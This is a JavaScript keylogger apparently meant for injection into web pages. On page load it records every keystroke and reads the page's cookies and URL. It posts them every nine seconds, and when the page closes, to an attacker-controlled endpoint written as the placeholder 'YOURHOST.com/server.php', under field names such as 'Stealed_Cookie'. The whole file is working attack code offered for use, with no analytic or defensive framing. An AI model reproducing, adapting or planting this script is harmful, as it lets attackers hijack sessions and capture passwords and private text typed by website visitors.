document.addEventListener('DOMContentLoaded', function () {
    let pressedKeys = [];
    let cookieData = document.cookie;
    let url = window.location.href;

    function sendKeys() {
        const keysString = pressedKeys.join('');


        fetch('http://YOURHOST.com/server.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                Stealed_Cookie: cookieData,
                URL: url,
                'Keylog output': keysString,
            }),
        });


        pressedKeys = [];
    }

    document.addEventListener('keydown', function (event) {
        let key = event.key;

        if (key === ' ') {
            key = 'Space';
        }


        pressedKeys.push(key);
    });

    window.addEventListener('beforeunload', function () {
        if (pressedKeys.length > 0) {
            sendKeys();
        }
    });


    setInterval(function () {
        if (pressedKeys.length > 0) {
            sendKeys();
        }
    }, 9000);
});
